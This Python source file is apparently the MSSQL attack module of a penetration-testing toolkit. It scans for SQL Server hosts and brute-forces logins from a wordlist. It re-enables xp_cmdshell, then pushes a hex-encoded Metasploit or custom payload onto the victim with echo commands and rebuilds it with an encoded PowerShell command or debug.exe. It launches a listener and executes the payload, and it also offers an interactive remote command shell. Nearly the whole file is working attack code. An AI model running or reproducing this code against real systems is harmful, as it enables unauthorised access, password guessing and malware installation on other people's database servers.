#!/usr/bin/python
from src.core import setcore
import _mssql
import sys
import subprocess
import socket
import re
import os
import time
import binascii
import base64
import shutil

#
# this is the mssql modules
#

# define the base path
definepath = os.getcwd()

operating_system = setcore.check_os()

# this is for the initial discovery for scanning
def scan(range,lowport,highport):
	# scan the ranges
	from src.core import portscan
	portscan=portscan.launch(range, lowport, highport)
	# if we returned values
	if portscan != False:
		return portscan
	# if nothing is returned
	if portscan == False:
		setcore.PrintWarning("No MSSQL servers were found in the ranges specified")
		return False
	# return the portscan value
	return portscan

#
# this is the brute forcer
#
def brute(ipaddr,username,port,wordlist):
        # if ipaddr being passed is invalid
        if ipaddr == "":
                return False
        if ipaddr != "":
        	# base counter for successful brute force
	        counter = 0
	        # build in quick wordlist
	        if wordlist == "default":
		        wordlist = "src/fasttrack/wordlist.txt"

        	# read in the file
	        password = file(wordlist, "r")
	        for passwords in password:
		        passwords = passwords.rstrip()
		        # try actual password
		        try:
                                print "Attempting to brute force " + setcore.bcolors.BOLD + ipaddr + setcore.bcolors.ENDC + " with username of " + setcore.bcolors.BOLD + username + setcore.bcolors.ENDC + " and password of " + setcore.bcolors.BOLD + passwords + setcore.bcolors.ENDC 
			        # connect to the sql server and attempt a password
			        target_server = _mssql.connect(ipaddr + ":" + str(port), username, passwords)
			        # print that we were successful
			        setcore.PrintStatus("\nSuccessful login with username %s and password: %s" % (username, passwords))
			        counter = 1
			        break

        		# if invalid password
	        	except Exception, e:
		        	pass

        	# if we brute forced a machine
	        if counter == 1:
		        return ipaddr + "," + username + "," + str(port) + "," + passwords
        	# else we didnt and we need to return a false
	        else:
                        if ipaddr != '':
                                setcore.PrintWarning("Unable to guess the SQL password for %s with username of %s" % (ipaddr,username))
        		return False
	

#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def deploy_hex2binary(ipaddr,port,username,password,option):
	# connect to SQL server
	target_server = _mssql.connect(ipaddr + ":" + str(port), username, password)
	setcore.PrintStatus("Connection established with SQL Server...")
	setcore.PrintStatus("Converting payload to hexadecimal...")
	# if we are using a SET interactive shell payload then we need to make the path under web_clone versus program_junk
	if os.path.isfile("src/program_junk/set.payload"):
		web_path = ("src/program_junk/web_clone/")
	# then we are using metasploit
	if not os.path.isfile("src/program_junk/set.payload"):
                if operating_system == "posix":
                        web_path = ("src/program_junk")
                        subprocess.Popen("cp src/html/msf.exe src/program_junk/ 1> /dev/null 2> /dev/null", shell=True).wait()
                        subprocess.Popen("cp src/program_junk/msf2.exe src/program_junk/msf.exe 1> /dev/null 2> /dev/null", shell=True).wait()
	fileopen = file("%s/msf.exe" % (web_path), "rb")
	# read in the binary
	data = fileopen.read()
	# convert the binary to hex
	data = binascii.hexlify(data)
	# we write out binary out to a file
	filewrite = file("src/program_junk/payload.hex", "w")
	filewrite.write(data)
	filewrite.close()

	# if we are using metasploit, start the listener
	if not os.path.isfile("%s/src/program_junk/set.payload" % (definepath)):
                if operating_system == "posix":
                        import pexpect
        		meta_path = setcore.meta_path()
                	setcore.PrintStatus("Starting the Metasploit listener...")
                        child2 = pexpect.spawn("%s/msfconsole -r src/program_junk/meta_config" % (meta_path))

	# random executable name
	random_exe = setcore.generate_random_string(10,15)

	#
	# next we deploy our hex to binary if we selected option 1 (powershell)
	#

	if option == "1":
		# powershell command here, needs to be unicoded then base64 in order to use encodedcommand
		powershell_command = unicode("$s=gc \"C:\\Windows\\system32\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"C:\\Windows\\system32\\%s.exe\",$b)" % (random_exe,random_exe))
	
		########################################################################################################################################################################################################
		#
		# there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
		# in order to get around this a null byte is pushed to each string value to fix this and make the encodedcommand work properly
		#
		########################################################################################################################################################################################################

		# blank command will store our fixed unicode variable
		blank_command = ""
		# loop through each character and insert null byte
		for char in powershell_command:
			# insert the nullbyte
			blank_command += char + "\x00"

		# assign powershell command as the new one
		powershell_command = blank_command
		# base64 encode the powershell command
		powershell_command = base64.b64encode(powershell_command)
		# this will trigger when we are ready to convert

	#
	# next we deploy our hex to binary if we selected option 2 (debug)
	#
	if option == "2":
		setcore.PrintStatus("Attempting to re-enable the xp_cmdshell stored procedure if disabled..")
		# reconfigure the stored procedure and re-enable
                try:
        		target_server.execute_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
	        	# need to do it a second time for some reason on 2005
		        target_server.execute_query("RECONFIGURE;")
                except: pass
		# we selected hex to binary
		fileopen = file("src/payloads/hex2binary.payload", "r")
		# specify random filename for deployment
		setcore.PrintStatus("Deploying initial debug stager to the system.")
		random_file = setcore.generate_random_string(10,15)
		for line in fileopen:
			# remove bogus chars
			line = line.rstrip()
			# make it printer friendly to screen
			print_line = line.replace("echo e", "")
			setcore.PrintStatus("Deploying stager payload (hex): " + setcore.bcolors.BOLD + str(print_line) + setcore.bcolors.ENDC)
			target_server.execute_query("xp_cmdshell '%s>> %s'" % (line,random_file))
		setcore.PrintStatus("Converting the stager to a binary...")
		# here we convert it to a binary
		target_server.execute_query("xp_cmdshell 'debug<%s'" % (random_file))
		setcore.PrintStatus("Conversion complete. Cleaning up...")
		# delete the random file
		target_server.execute_query("xp_cmdshell 'del %s'" % (random_file))

	# here we start the conversion and execute the payload

	setcore.PrintStatus("Sending the main payload via to be converted back to a binary.")
	# read in the file 900 bytes at a time
	fileopen = file("src/program_junk/payload.hex", "r")
	#random_exe = setcore.generate_random_string(10,15)
	while fileopen:
		data = fileopen.read(900).rstrip()
		# if data is done then break out of loop because file is over
		if data == "": break			
		setcore.PrintStatus("Deploying payload to victim machine (hex): " + setcore.bcolors.BOLD + str(data) + setcore.bcolors.ENDC + "\n")
		target_server.execute_query("xp_cmdshell 'echo %s>> %s'" % (data, random_exe))
	setcore.PrintStatus("Delivery complete. Converting hex back to binary format.")

	# if we are using debug conversion then convert our binary
	if option == "2":
		target_server.execute_query("xp_cmdshell 'rename MOO.bin %s.exe'" % (random_file))
		target_server.execute_query("xp_cmdshell '%s %s'" % (random_file, random_exe))
		# clean up the old files
		setcore.PrintStatus("Cleaning up old files..")
		target_server.execute_query("xp_cmdshell 'del %s'" % (random_exe))

	# if we are using SET payload
	if os.path.isfile("%s/src/program_junk/set.payload" % (definepath)):	   
		setcore.PrintStatus("Spawning seperate child process for listener...")
                try: shutil.copyfile("src/program_junk/web_clone/x", definepath)
        	except: pass
        	
		# start a threaded webserver in the background
		#import src.html.fasttrack_http_server
		subprocess.Popen("python src/html/fasttrack_http_server.py", shell=True)
		#child1 = pexpect.spawn("python src/html/fasttrack_http_server.py")
		# grab the port options
		if os.path.isfile("%s/src/program_junk/port.options" % (definepath)):
			fileopen = file("%s/src/program_junk/port.options" % (definepath), "r")
			port = fileopen.read().rstrip()
		# if for some reason the port didnt get created we default to 443
		if not os.path.isfile("%s/src/program_junk/port.options" % (definepath)): port = "443" # default 443
		# launch the python listener through pexpect
		# need to change the directory real quick
		os.chdir(definepath)
		#child2 = pexpect.spawn("python src/payloads/set_payloads/listener.py %s" % (port))
		# now back 
		os.chdir("src/program_junk/web_clone/")

	setcore.PrintStatus("Triggering payload stager...")
	# thread is needed here due to the connect not always terminating thread, it hangs if thread isnt specified 
	import thread
	# execute the payload
	# we append more commands if option 1 is used
	if option == "1":
		random_exe_execute = random_exe
		random_exe = "powershell -EncodedCommand " + powershell_command

	sql_command = ("xp_cmdshell '%s'" % (random_exe))
	# start thread of SQL command that executes payload
	thread.start_new_thread(target_server.execute_query, (sql_command,))
	#time.sleep(5)
	time.sleep(1)
	# trigger the exe if option 1 is used
	if option == "1":
		sql_command = ("xp_cmdshell '%s'" % (random_exe_execute))
		thread.start_new_thread(target_server.execute_query, (sql_command,))
	# if pexpect doesnt exit right then it freaks out
	if os.path.isfile("%s/src/program_junk/set.payload" % (definepath)):
        	os.system("python ../../payloads/set_payloads/listener.py")
	try:
		# interact with the child process through pexpect
		child2.interact()
		try:
        		os.remove("x")
        	except: pass
	except: pass


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def cmdshell(ipaddr,port,username,password,option):
        # connect to SQL server
        mssql = _mssql.connect(ipaddr + ":" + str(port), username, password)
        setcore.PrintStatus("Connection established with SQL Server...")
        setcore.PrintStatus("Attempting to re-enable xp_cmdshell if disabled...")
        try:
                mssql.execute_query("EXEC sp_configure 'show advanced options', 1;GO;RECONFIGURE;GO;EXEC sp_configure 'xp_cmdshell', 1;GO;RECONFIGURE;GO;")
                mssql.execute_query("RECONFIGURE;")
        except Exception, e: pass
        setcore.PrintStatus("Enter your Windows Shell commands in the xp_cmdshell - prompt...")
        mssql.select_db('master')
        while 1:
                # cmdshell command
                cmd = raw_input("xp_cmdshell> ")
                # exit if we want
                if cmd == "quit" or cmd == "exit": break
                mssql.execute_query("xp_cmdshell '%s'" % (cmd))
                if cmd != "":
                        for line in mssql:
                                line = str(line)
                                line = line.replace("', 'output': '", "\n")
                                line = line.replace("{0: '", "")
                                line = line.replace("'}", "")
                                line = line.replace("{0: None, 'output': None}", "")
                                line = line.replace("\\r", "")
                                line = line.replace("The command completed with one or more errors.", "")
                                print line
